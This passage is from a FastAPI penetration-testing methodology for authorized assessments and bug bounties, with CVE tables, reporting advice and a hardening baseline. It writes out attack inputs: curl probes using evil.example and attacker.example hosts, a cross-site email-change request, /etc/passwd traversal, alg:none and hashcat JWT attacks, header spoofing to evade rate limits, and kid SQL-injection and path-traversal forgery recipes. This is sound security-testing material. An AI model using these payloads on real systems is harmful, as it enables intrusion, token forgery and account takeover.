Goal: the trust boundaries around the app, where FastAPI's defaults help attackers more than defenders.

### 6.1 CORS with credentials

```bash
curl -i https://api.example.com/account \
  -H 'Origin: https://evil.example' \
  -H "Authorization: Bearer $TOKEN"
```

Finding signals: `Access-Control-Allow-Origin: https://evil.example` (reflection) combined with `Access-Control-Allow-Credentials: true`, or wildcard origins with credentials. CORS is browser-only access control — the report impact must be framed as "a malicious page can act as the victim's authenticated browser", not "anyone can call the API".

```python
# RISKY (seen constantly)              # SAFER
app.add_middleware(                    app.add_middleware(
    CORSMiddleware,                        CORSMiddleware,
    allow_origins=["*"],                   allow_origins=["https://app.example.com"],
    allow_credentials=True,                allow_credentials=True,
    allow_methods=["*"],                   allow_methods=["GET","POST","PATCH","DELETE"],
    allow_headers=["*"],                   allow_headers=["Authorization","Content-Type"],
)                                       )
```

Two mechanism details make this worse than it looks. Starlette's `CORSMiddleware` does **not** reject `allow_origins=["*"]` combined with `allow_credentials=True` at startup — with both set, it silently *reflects* the request's `Origin` back alongside `Access-Control-Allow-Credentials: true`, which is precisely the exploit configuration. And for cookie-authenticated apps on old stacks, check the classic: FastAPI before 0.65.2 (CVE-2021-32677) parsed `text/plain` bodies as JSON, and `text/plain` is CORS-preflight-exempt — a "simple request" the browser fires cross-site with cookies attached, no preflight, no CSRF token:

```bash
curl -i -X POST https://api.example.com/settings/email \
  -H 'Content-Type: text/plain' -b "session=$SESSION_COOKIE" \
  --data '{"email": "attacker@example.com"}'
```

A 200 here on a cookie-authenticated app is CSRF without needing the CORS misconfig at all. On modern stacks, enumerate which content types each state-changing endpoint actually accepts — JSON parsing behind unexpected `Content-Type` values is still worth a report when cookies are in play.

### 6.2 Host header and URL trust

```bash
# Does an arbitrary Host change app behavior (links, redirects, emails)?
curl -i https://api.example.com/password-reset -H 'Host: attacker.example'
curl -i https://api.example.com/ -H 'X-Forwarded-Host: attacker.example'
# Does the app trust client-supplied proxy headers for identity or limits?
curl -i https://api.example.com/auth/token -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=alice&password=x'
```

Missing `TrustedHostMiddleware` (or the Starlette BadHost behavior from Phase 3.6, or request-target poisoning per CVE-2026-54282 in 7.2) plus any absolute-URL generation is a chain: poisoned password-reset links, cache poisoning, tenant confusion.

One layer deeper sits Uvicorn, whose proxy-header defaults create two opposite failure modes. `--proxy-headers` is on by default, but Uvicorn honors `X-Forwarded-*` only from `--forwarded-allow-ips`, which defaults to `127.0.0.1`. Behind a container ingress on a different IP, Uvicorn ignores the proxy headers entirely: `request.client.host` resolves to the proxy's address, so IP-based rate limiters throttle *all* users as one client, and generated redirects point at `http://localhost`. The tempting fix, `--forwarded-allow-ips="*"`, reopens spoofing — any client that can reach Uvicorn directly forges `X-Forwarded-For` and `X-Real-IP`, defeating rate limits, IP allowlists, and audit logs. Both are observable from outside:

```bash
# Signal 1 — does a forged XFF reset a rate limit your real IP exhausted?
for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\n' \
  https://api.example.com/auth/token -H 'X-Forwarded-For: 203.0.113.99' \
  -d 'username=alice&password=x'; done
# Signal 2 — throttled sooner than your own request count justifies?
# everyone is sharing the proxy's single-IP budget
```

### 6.3 WebSockets and headers

If `/ws` routes exist: check that the handshake authenticates (not just the first message), that `Origin` is validated, and that authorization is enforced per-message for privileged actions — WebSocket handlers are just as prone to BOLA as HTTP handlers, and developers forget them because they are not in the REST surface.

### 6.4 On the wire: TLS posture and passive observation

Look at the port itself before trusting the header-level findings above. Capture traffic on a segment you are authorized to observe (tcpdump/mitmproxy): is the FastAPI port actually TLS, or plaintext HTTP relying on an upstream terminator? If the app serves plaintext and TLS is terminated elsewhere, application data crosses the internal segment in the clear — a deployment-boundary property no scanner asserts for you. In most bounty programs this is a hardening note; in an authorized assessment it is often the single most important observation. Passive watching also pays off against 3.5: a stream of real responses shows which sensitive fields actually ship, without sending a single probe.

### 6.5 Middleware ordering: the LIFO stack

Starlette wraps middleware last-in-first-out: the **last** `app.add_middleware()` call is the outermost layer — it sees requests first and responses last. Registration order is therefore a security property, not a style preference. The recurring mistakes: a custom middleware added *after* (outside) `TrustedHostMiddleware` that returns early, skipping the host check on some paths; `CORSMiddleware` buried under a middleware that short-circuits, so some responses ship without CORS headers; instantiating `FastAPI()` twice in one module, leaving half the routes outside the middleware stack entirely.

```bash
# Compare header sets across paths and error types — the cheapest ordering probe
curl -sI https://api.example.com/good/route | sort > h1.txt
curl -sI https://api.example.com/bad/route | sort > h2.txt       # 404/500 path
curl -s -i -X POST https://api.example.com/good/route -d '{}' \
  -H 'Content-Type: application/json' | awk 'NR==1,/^$/' | sort > h3.txt  # 422 path
diff h1.txt h2.txt; diff h1.txt h3.txt
```

Responses missing headers their siblings carry — CORS, `X-Content-Type-Options`, anything set in middleware — mark a path where an outer layer returned before the inner ones ran. That is the seam to pull: combine it with the path-gate probes from 3.6 (does the gated route still enforce authz on its *error* paths?), and remember that custom exception-handler responses can skip middleware-added headers too. Header inconsistency across paths is reportable as recon intelligence on its own — and it frequently unmasks an auth bypass behind it.

---

## Phase 7 — Disclosure and dependency attack surface

### 7.1 Information disclosure

```bash
for p in docs redoc openapi.json .env .git/config __debugger__; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" https://api.example.com/$p
done
# Verbose 500s: send a malformed-but-signed request and read the body
```

Verbose stack traces in 500s (leak of library versions, file paths, SQL), model internals in 422s, and exposed `.env`/`.git` are the standard set. `/docs` exposure is a judgment call: publicly documented APIs are legitimate; the finding is when *internal* routes, schemas, or admin models are visible.

### 7.2 Known CVE quick table (verified)

| Package | CVE | Problem | Fixed |
|---|---|---|---|
| starlette < 0.40.0 | CVE-2024-47874 | Multipart text-field memory exhaustion DoS in any Starlette/FastAPI app accepting forms; effective even behind proxy size limits | 0.40.0 |
| starlette < 1.0.1 | CVE-2026-48710 ("BadHost") | `request.url.path` can diverge from the routed path under a malformed Host header; breaks path-based authz/allowlists in middleware | 1.0.1 |
| python-jose ≤ 3.3.0 | CVE-2024-33663 | Algorithm confusion (ECDSA/DER key formats); NVD lists through 3.3.0, follow-up analysis found the fix incomplete through 3.5.0 | 3.4.0 (incomplete) |
| python-jose ≤ 3.3.0 | CVE-2024-33664 | "JWT bomb" — crafted JWE causes resource exhaustion during decode | 3.4.0 |
| python-multipart ≤ 0.0.6 | CVE-2024-24762 | ReDoS: a crafted `Content-Type` option string stalls the event loop for minutes on any form-parsing endpoint — single request, no auth needed | 0.0.7 |
| starlette < 0.25.0 | CVE-2023-30798 | Earlier multipart DoS in the same class: MultipartParser accepts an unlimited *number* of empty form fields/files → memory/CPU exhaustion, unauthenticated | 0.25.0 |
| idna < 3.7 | CVE-2024-3651 | Resource exhaustion in `idna.encode()` on crafted labels; idna sits under httpx/requests URL handling — reachable wherever user input becomes a hostname (webhooks, email/URL validation) | 3.7 |
| fastapi < 0.65.2 | CVE-2021-32677 | CSRF in cookie-authenticated apps: `text/plain` bodies carrying JSON are parsed as JSON, and text/plain is CORS-preflight-exempt — a malicious page fires state-changing requests with the victim's cookies | 0.65.2 |
| h11 < 0.16.0 | CVE-2025-43859 | Lenient parsing of line terminators in chunked-encoding bodies enables request smuggling when paired with a lenient reverse proxy (proxy/app desync) | 0.16.0 |
| starlette 0.4.1 – < 1.3.1 | CVE-2026-54283 | `request.form()` silently ignores `max_fields`/`max_part_size` for urlencoded bodies — a sub-10MB body with ~1M fields stalls the event loop even on apps that set limits | 1.3.1 |
| starlette 0.111.0 – < 0.137.0 | CVE-2026-54282 | A request target without a leading `/` is concatenated into the authority and poisons `request.url.hostname`/`netloc` — misleads any code trusting the reconstructed host | 0.137.0 |
| starlette ≤ 1.0.1 | CVE-2026-48817 | HTTPEndpoint lowercases the verb and dispatches via `getattr`, so non-standard methods (e.g. `_DO_DELETE`) invoke unintended helper methods | 1.1.0 |
| starlette < 1.1.0 | CVE-2026-48818 | StaticFiles on Windows: UNC paths trigger outbound SMB and leak the service account's NTLMv2 hash to the attacker — StaticFiles is typically unauthenticated | 1.1.0 |
| starlette < 0.49.1 | CVE-2025-62727 | Crafted `Range` headers trigger O(n²) processing in FileResponse/StaticFiles — unauthenticated CPU exhaustion per request | 0.49.1 |
| python-multipart < 0.0.22 | CVE-2026-24486 | Arbitrary file write via path traversal in the uploaded filename when the app sets `UPLOAD_DIR` + `UPLOAD_KEEP_FILENAME=True` | 0.0.22 |
| pydantic < 2.4.0 (and < 1.10.13) | CVE-2024-3772 | ReDoS in email validation — a crafted `EmailStr` value stalls the worker | 2.4.0 / 1.10.13 |
| pydantic-ai < 1.51.0 | CVE-2026-25640 | Path traversal in the agent web UI (`Agent.to_web()`) serves attacker JavaScript under the UI's origin — chat-history theft; sibling 2026 advisories cover SSRF in its fetch tools | 1.51.0 |

Phase 0's fingerprinting tips turn this table into checks: any form-accepting target on Starlette < 0.40.0 (or < 0.25.0, or with urlencoded limits silently ignored per CVE-2026-54283, or python-multipart ≤ 0.0.6) is a Phase 5.3 finding; any file-serving target on Starlette < 0.49.1 is one Range-header probe away from CPU exhaustion; an AI-service target running a pydantic-ai web UI is a 4.3 check. The h11 row is special: smuggling only manifests as a desync between the proxy and the app, so testing it means proxy-relative smuggling payloads — explicitly authorized engagements only. And audit the *deployed* stack, not the repo: container images and lockfiles can pin stale wheels long after `requirements.txt` looks clean. `pip-audit`/`osv-scanner` (Appendix C) automate this table for your own test apps.

---

## 8. Reporting for bug bounty

The report is the product. Structure every finding the same way:

1. **Title — impact first.** "User A can read and modify every invoice of User B (BOLA on `GET/PATCH /invoices/{invoice_id}`)" beats "IDOR found".
2. **Preconditions.** Two accounts, minimal privilege, nothing exotic.
3. **Steps / PoC.** Copy-pasteable `curl` or Python, one request per step, expected vs. actual response.
4. **Evidence.** Redacted screenshots or response bodies; never exfiltrate more data than the proof needs, and clean up test accounts.
5. **Remediation.** One paragraph, FastAPI-specific — point at the code pattern from the relevant phase above (this also signals to the triager that you understand the root cause).

Severity rules of thumb: cross-user/cross-tenant read of private data — High; state change or privilege escalation (mass assignment, BOLA write, BFLA admin) — Critical; SSRF to internal network — High; credentialed CORS reflection — Medium; verbose errors and docs exposure — Low/Info. Map to the program's rubric, and cite OWASP API Security Top 10 2023 categories (API1 BOLA, API5 BFLA) when the triager expects them.

### OWASP API Security Top 10 (2023) cross-reference

| Category | Where it is tested here |
|---|---|
| API1 Broken Object Level Authorization | 3.1–3.2 (two-account swap), 1.4 (GraphQL resolvers), 4.5 (task results) |
| API2 Broken Authentication | Phase 2 (token matrix, login, refresh rotation) |
| API3 Broken Object Property Level Authorization | 3.4 (mass assignment), 3.5 (response over-exposure) |
| API4 Unrestricted Resource Consumption | 5.1–5.4 (parser, depth, regex, event loop), 3.7 (races) |
| API5 Broken Function Level Authorization | 3.3 (BFLA + dependency-chain audit) |
| API6 Unrestricted Access to Sensitive Business Flows | 3.7 (races on once-per-user flows), 2.3 (rate limits) |
| API7 Server Side Request Forgery | 4.4 (fetchers), 4.5 (task workers) |
| API8 Security Misconfiguration | Phase 0 (headers, docs), Phase 6 (CORS, host, proxy) |
| API9 Improper Inventory Management | 1.2 (hidden routes, stale API versions) |
| API10 Unsafe Consumption of APIs | 4.4 (blind trust in downstream/third-party responses) |

### Coverage closeout — falsifiable claims

Know when you are done, and be able to defend it. Frame coverage as claims you actively tried to *disprove*: a claim you attacked hard and could not break is evidence; a checklist you ticked is not. For each claim below, record the method, the payloads, the result — and the boundary you did not cross, so any residual-risk statement stays honest.

| Claim you tried to prove | Rejected (secure) if |
|---|---|
| An unauthenticated request reaches a data-bearing route | every schema route returns 401/403 without credentials |
| A low-privilege user can read or modify another user's object by ID | every cross-object attempt is blocked (3.1) |
| Error and validation responses leak sensitive data or internals | 422/500 bodies carry no sensitive fields or stack traces |
| Sensitive data crosses a boundary readable by an attacker | sensitive traffic is TLS-protected on every segment you can observe (6.4) |
| A crafted input reaches an unsafe sink | no parameter reaches a DB/OS/template/URL sink unvalidated (Phase 4) |
| A single client can deny service | body, rate, and resource limits hold under the abuse you are authorized to send (Phase 5, 3.7) |
| Introspection surfaces hand over a map | `/docs`, `/redoc`, `/openapi.json` are off or auth-gated (Phase 0, 7.1) |

The one claim you can rarely close from outside: plaintext-on-the-wire when TLS terminates outside the app (6.4). Name it as a deployment requirement on the customer, not a property of the application.

---

## Appendix A — FastAPI hardening baseline

The defensive mirror of this methodology; useful in your remediation sections.

```python
from fastapi import FastAPI, Depends, Security
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.trustedhost import TrustedHostMiddleware

app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)  # or gate them behind auth

app.add_middleware(TrustedHostMiddleware,
                   allowed_hosts=["api.example.com"])

app.add_middleware(CORSMiddleware,
                   allow_origins=["https://app.example.com"],
                   allow_credentials=True,
                   allow_methods=["GET", "POST", "PATCH", "DELETE"],
                   allow_headers=["Authorization", "Content-Type"])

# middleware wraps LIFO — the LAST add_middleware() call runs first on requests;
# register custom wrappers before the security middleware, never after,
# and instantiate FastAPI() exactly once per module
# every object route: ownership check inside the handler
# every admin router: dependencies=[Security(require_admin, scopes=[...])]
# every token decode: pinned algorithms + exp/iss/aud + rotation
# every dynamic SQL structure: allowlist
# every server-side fetch: scheme/host allowlist
# every file response: DB id -> stored path, never a client path
```

Plus the operational layer: request size limits at the proxy *and* app, patched Starlette/Pydantic/python-multipart/h11, PyJWT + pwdlib[argon2] (`PasswordHash.recommended()`, the FastAPI docs' current stack) over the unmaintained python-jose/passlib combination, tokens short-lived with refresh rotation, no auth decisions in path-based middleware, no blocking calls inside `async def` routes, and Uvicorn bound privately with `--forwarded-allow-ips` set to the proxy's exact IP.

## Appendix B — Command quick reference

```bash
jq -r '.paths|keys[]' openapi.json                    # all routes
ffuf -w api-words.txt -u https://api.example.com/FUZZ -fc 404   # hidden routes
curl -i https://t/ -H 'Host: attacker.example'        # host trust
curl -i https://t/ -H 'Origin: https://evil.example'  # CORS reflection
curl -s --path-as-is https://t/files/../../etc/passwd # traversal
python3 jwt_tool.py $TOKEN -X a                       # alg:none
hashcat -m 16500 jwt.txt rockyou.txt                  # weak secret
st run --checks all https://api.example.com/openapi.json  # schema fuzz
```

## Appendix C — Tooling: anything that consumes OpenAPI is a FastAPI tool

There is no "FastAPI pentest suite" — but FastAPI's defining trait is a machine-readable contract at a known path, so the tools that matter are the ones that consume OpenAPI. Ordered by reach-for frequency:

**Schema-driven, black-box.** **Schemathesis** is the first reach: property-based generation (Hypothesis) from the live schema, asserting no 5xx, response-schema conformance, and status-code conformance, with stateful sequence support (Appendix B has the one-liner). **RESTler** (Microsoft Research) is the stateful pick: it infers producer→consumer dependencies between calls (create → capture id → use id) and fuzzes sequences, finding use-after-create and ordering bugs that single-request tools cannot see; more setup, worth it. **CATS** (Endava, actively developed) is the thorough one: 190+ fuzzers, stateful execution waves that learn resource IDs from 2xx responses, and explicit checks for the OWASP API Top 10 classes (BOLA, mass assignment, injection, SSRF). **Dredd** is conformance-only — does the live API match its spec — and its repository was archived in November 2024, so treat it as legacy. **APIFuzzer** (KissPeter) is a light Python field-fuzzer: older, zero effort.

**Source-aware, when the repo is in scope.** **Semgrep** with the registry's Python rules flags the exact patterns black-box tools can only infer — unsafe eval/subprocess, hardcoded secrets. Better: **route-detect** (Semgrep-based, FastAPI supported) is purpose-built for the highest-value check in this document — listing every route and whether it has authn/authz. The reusable move is to encode your own conventions once ("every sensitive route needs auth + a narrowed `response_model`") as a private ruleset and re-run it across every target. **Bandit** is the quick SAST pass; **pip-audit** and **osv-scanner** audit the actual lockfile against the 7.2 table.

**Template-based and extensible.** **Nuclei** has nothing FastAPI-native, but template the tells once — `/docs`, `/redoc`, `/openapi.json` exposure, the default 422 shape, common route names — and you own a private template pack that pays off on every FastAPI target. **Tsunami** (Google) accepts custom detector plugins; heavyweight for most engagements.

**The honest gap.** No off-the-shelf tool asserts the property that matters most in data-heavy FastAPI apps: *does sensitive data actually cross the wire?* Semgrep and route-detect flag the code smell — a route returning a full ORM model instead of a trimmed `response_model`, the root of 3.5 — but confirming what actually ships in bodies, error messages, and headers is a custom content-classification pass: a small mitmproxy/tshark addon that flags your target's sensitive shapes (record IDs, national ID formats, tokens) on any observed response. Script it once; nothing off the shelf does it.

## References

- OWASP API Security Top 10 (2023) — https://owasp.org/www-project-api-security/
- FastAPI docs: CORS — https://fastapi.tiangolo.com/tutorial/cors/
- GHSA-f96h-pmfr-66vw, Starlette multipart DoS (CVE-2024-47874) — https://github.com/encode/starlette/security/advisories/GHSA-f96h-pmfr-66vw
- Debian tracker, CVE-2024-47874 — https://security-tracker.debian.org/tracker/CVE-2024-47874
- Kodem archive, CVE-2024-47874 PoC — https://www.kodemsecurity.com/cve-archive/cve-2024-47874
- NVD, CVE-2024-33663 (python-jose algorithm confusion) — https://nvd.nist.gov/vuln/detail/cve-2024-33663
- GHSA-cjwg-qfpm-7377, python-jose JWE DoS (CVE-2024-33664) — https://github.com/advisories/GHSA-cjwg-qfpm-7377
- VulnCheck, python-jose incomplete fix through 3.5.0 — https://www.vulncheck.com/advisories/python-jose-through-3.5.0-algorithm-confusion-via-der-encoded-public-key-as-hmac-secret
- CVE-2026-48710 ("BadHost") details as described in the source material provided for this methodology (Penligent, 2026-07-05): Starlette before 1.0.1, `request.url.path` divergence under malformed Host headers.
- GHSA-2jv5-9r88-3w3p, python-multipart Content-Type ReDoS (CVE-2024-24762) — https://github.com/advisories/GHSA-2jv5-9r88-3w3p
- GHSA-jjg7-2v4v-x38h, idna resource exhaustion (CVE-2024-3651) — https://github.com/advisories/GHSA-jjg7-2v4v-x38h
- NVD, CVE-2023-30798 (Starlette multipart field-count DoS) — https://nvd.nist.gov/vuln/detail/CVE-2023-30798
- Kodem archive, CVE-2023-30798 — https://www.kodemsecurity.com/cve-archive/cve-2023-30798
- Schemathesis — https://github.com/schemathesis/schemathesis
- RESTler — https://github.com/microsoft/restler-fuzzer
- CATS — https://github.com/Endava/cats
- route-detect — https://github.com/mschwager/route-detect
- osv-scanner — https://github.com/google/osv-scanner
- Dredd (repository archived November 2024) — https://github.com/apiaryio/dredd
- APIFuzzer — https://github.com/KissPeter/APIFuzzer
- GHSA-8h2j-cgx8-6xv7, FastAPI text/plain CSRF (CVE-2021-32677) — https://github.com/fastapi/fastapi/security/advisories/GHSA-8h2j-cgx8-6xv7
- Debian tracker, CVE-2021-32677 — https://security-tracker.debian.org/tracker/CVE-2021-32677
- GHSA-vqfr-h8mv-ghfj, h11 chunked-encoding leniency / request smuggling (CVE-2025-43859) — https://github.com/advisories/GHSA-vqfr-h8mv-ghfj
- GHSA-7f5h-v6xp-fcq8, Starlette Range-header quadratic DoS (CVE-2025-62727) — https://github.com/advisories/GHSA-7f5h-v6xp-fcq8
- GHSA-82w8-qh3p-5jfq, Starlette urlencoded form limits ignored (CVE-2026-54283) — https://github.com/advisories/GHSA-82w8-qh3p-5jfq
- GHSA-jp82-jpqv-5vv3, Starlette request-target authority poisoning (CVE-2026-54282) — https://github.com/advisories/GHSA-jp82-jpqv-5vv3
- NVD, CVE-2026-48817 (Starlette HTTPEndpoint method dispatch) — https://nvd.nist.gov/vuln/detail/CVE-2026-48817
- GHSA-wqp7-x3pw-xc5r, Starlette StaticFiles Windows UNC / NTLM leak (CVE-2026-48818) — https://github.com/advisories/GHSA-wqp7-x3pw-xc5r
- GHSA-wp53-j4wj-2cfg, python-multipart upload path traversal (CVE-2026-24486) — https://github.com/advisories/GHSA-wp53-j4wj-2cfg
- GHSA-mr82-8j83-vxmv, pydantic email-validation ReDoS (CVE-2024-3772) — https://github.com/advisories/GHSA-mr82-8j83-vxmv
- NVD, CVE-2026-25640 (pydantic-ai web UI path traversal) — https://nvd.nist.gov/vuln/detail/CVE-2026-25640
- FastAPI docs: OAuth2 with JWT (pwdlib/Argon2) — https://fastapi.tiangolo.com/tutorial/security/oauth2-jwt

## Supplement — dependency-CVE update (added 2026-11-13)

*Source: external research note (November 2026); every item below re-verified against primary advisories at import. These rows extend Phase 2 (JWT) and Phase 7 (dependency attack surface); nothing above was rewritten.*

### JWT library landscape — both sides of the swap are now version-gated

The Phase 7 remediation advice ("PyJWT over python-jose") needs a version floor, because **PyJWT itself shipped a 14-advisory cluster in September 2026**:

| Library | Versions | CVE | Bug (attacker view) |
|---|---|---|---|
| python-jose | ≤ 3.5.0 (**no fixed release exists; project dormant since 2025-05**) | CVE-2026-85394 (CVSS 9.3) | The named follow-up to CVE-2024-33663: the HMAC-secret guard (`is_pem_format(key) or is_ssh_key(key)`) rejects PEM/SSH armor but **not raw DER** public-key bytes. If the server feeds its public key to `decode()` as raw DER (`.der`/`.cer` file or `public_bytes(Encoding.DER,…)`) and algorithms are unrestricted (`algorithms=None` performs no allowlist check) or mixed RS+HS, forge HS256 tokens signed with the public key. There will never be a patch — any python-jose deployment meeting the conditions is a finding regardless of version. |
| PyJWT | < 2.14.0 | CVE-2026-102268 (CVSS 9.1) | `is_pem_format()` misses PEM variants the `cryptography` loader accepts — a **mutated** public-key PEM passed as raw bytes bypasses the CVE-2022-29217 guard and is treated as the HMAC secret. Same forge-HS256-with-public-key primitive as above, inside the library everyone recommends. |
| PyJWT | < 2.15.0 | CVE-2026-102271 | DER-key variant of the same confusion bypass. |
| PyJWT | < 2.15.0 | CVE-2026-101918 | Nested-JSON token payload → `RecursionError` → HTTP 500; request-level DoS. |
| PyJWT | < 2.12.0 | CVE-2026-32597 | Unknown `crit` header extensions accepted (RFC 7515 violation). |

Practical upshot for the Phase 2 token matrix: the "HS256 token signed with the target's public key" row now has two library-level paths, not just a misconfigured-allowlist path — check the target's PyJWT version, not only its `algorithms=` list. Safe floor for remediation: **PyJWT ≥ 2.15.0**. (CVE-2025-45768, "PyJWT enforces no minimum HMAC secret length," is disputed but short secrets remain worth a magnum-judged guess.)

### Additional framework DoS rows for the Phase 7 table

| Component | Versions | CVE | Bug |
|---|---|---|---|
| Starlette | < 0.47.2 | CVE-2025-54121 | Large multipart file rollover to disk **blocks the event loop** — one worker per request; a framework-level instance of the §5.4 starvation class. |
| python-multipart | < 0.0.26 / < 0.0.27 | CVE-2026-40347 / CVE-2026-42561 | DoS via large multipart preamble/epilogue; unbounded part headers. |

### Verify before you report — two traps

- A widely-shared Medium post claims "CVE-2026-2978, critical RCE in FastAPI < 0.115.8". It does not exist in any advisory database; the adjacent IDs (CVE-2026-2975/2976/2977) belong to the third-party FastApiAdmin project (CVE-2026-2976: unauthenticated `file_path` download). A target-side FastAPI-core RCE claim is extraordinary — demand an advisory link.
- Vendor blogs disagreed on the CVE-2026-54283 fix version (0.50.0 vs 1.3.1). The GitHub advisory (GHSA-82w8-qh3p-5jfq) is authoritative: affected ≥ 0.4.1, < 1.3.1. When a PoC blog and the GHSA conflict, gate on the GHSA.

Agent-hygiene note: generating code from an untrusted `openapi.json` with fastapi-code-generator < 0.8.1 is itself code injection (CVE-2026-63469/70/71, CVSS 9.3) — never feed a hostile schema to a generator.

## Supplement 2 — token-pipeline operational additions (added 2026-11-13)

*Source: independent model-drafted Phase-2 methodology, adversarially reviewed; every CVE re-verified against primary advisories. Extends Phase 2 with five operational gaps: channel enumeration, JOSE-header injection, public-key acquisition, library fingerprinting, and rotation adjudication.*

### Token-channel enumeration (extends the Phase 2 placement notes)

FastAPI imposes no single scheme — the developer wires a security class, and legacy clients often leave extra channels live. Enumerate *every* channel before testing the token itself: replay one known-valid token across locations; **each undocumented 200 is itself a finding**, independent of any token flaw.

| Channel | Typical FastAPI wiring | Pitfall to test |
|---|---|---|
| `Authorization: Bearer` | `OAuth2PasswordBearer`, `HTTPBearer` | Case variants (`bearer`), whitespace tolerance, duplicate headers |
| Cookie | `APIKeyCookie`, manual `request.cookies` read | Missing `HttpOnly`/`Secure`/`SameSite`; **dual header+cookie acceptance re-enables CSRF against an otherwise header-only API** |
| Query param (`?token=`, `?access_token=`) | `APIKeyQuery`, manual read | Worst by default: token lands in access/proxy logs, browser history, and third-party `Referer` leaks. Its *presence* as an accepted channel is reportable even if every token is legitimate |
| Custom header (`X-API-Key`) | `APIKeyHeader` | Often a static non-expiring secret: test rotation, rate limiting, and whether it outranks user-token scopes |
| WebSocket | `websocket.headers` / query / first frame | Browsers cannot set WS headers → apps fall back to query tokens (logging problem) or in-band auth; **test whether messages are processed before auth completes** |

### JOSE-header injection rows (absent from the Phase 2 matrix)

| Test | Craft | Accept = |
|---|---|---|
| `kid` path traversal | `kid: ../../dev/null` (or any predictable-content file) → sign with the known bytes (empty key for `/dev/null`) | Critical |
| `kid` SQLi | `kid: nonexistent' UNION SELECT 'attackerkey'--` → sign with `attackerkey` | Critical |
| `jwk` embedded key | Header carries your own JWK; sign with the matching private key | Critical |
| `jku` URL fetch | `jku` pointing at your JWKS host; requires outbound fetch from the verifier | Critical |

### Obtaining the public key (precondition for confusion tests)

In order: `/.well-known/jwks.json` and `/.well-known/openid-configuration`; a `jwk`/`x5c` field embedded in a legitimate token's header; docs/repo leaks; (rarely) TLS-cert keypair reuse. **No public key → the confusion test is not demonstrable; say so in the report rather than forcing it.**

### Fingerprinting the auth library from responses

Corroborate 2–3 tells before asserting a library: the 401 body shape (`OAuth2PasswordBearer` → `{"detail":"Not authenticated"}` + `WWW-Authenticate: Bearer`; `HTTPBearer` differs on missing-vs-malformed trigger); a Pydantic-style 422 `detail[]` array on a garbage token reveals FastAPI validation in the auth path; expired-token error wording (`ExpiredSignatureError` surfaces similarly in python-jose and PyJWT — custom-handler differences separate them); a JWKS endpoint with `kid` routing implies `PyJWKClient` (PyJWT) or authlib. **A leaked raw exception string ("Signature has expired", stack fragments) is a separate information-disclosure finding** — capture it verbatim.

### Refresh-rotation adjudication (three outcomes, one replay)

Replay the *consumed* refresh token once, then read the family: (1) reuse **accepted** → no rotation/no reuse detection, High; (2) 401 **and** the successor token also dead → correct behavior, server revoked the token family per RFC recommendation; (3) 401 but the successor still valid → rotation without family revocation, Medium (replay window remains). Follow-ups: use-after-logout, absolute-vs-idle lifetime, cross-account binding.

### Mutated-PEM forms for CVE-2026-102268 (verified, GHSA-ffc3-869f-jxw9)

The concrete bypass forms the supplement's PyJWT row needs: a public-key PEM with **marker-adjacent whitespace/indentation, bare-CR (`\r`) line terminators, or all lines folded to one** makes `is_pem_format()` return `False` while `cryptography.load_pem_public_key()` accepts the identical bytes — guard skipped, public key becomes the HMAC secret. Preconditions: verification key passed as raw bytes on the non-`PyJWK` path, `cryptography` installed, mixed HS+asymmetric allow-list. Target-modeling note from the advisory: these forms **arise naturally** from an indented YAML/JSON config block, a single-line environment variable, or CR/LF round-trips through config tooling — a deployment-shape oracle, not a lab-only mutation. Reproduced upstream on 2.13.0; fixed 2.14.0.
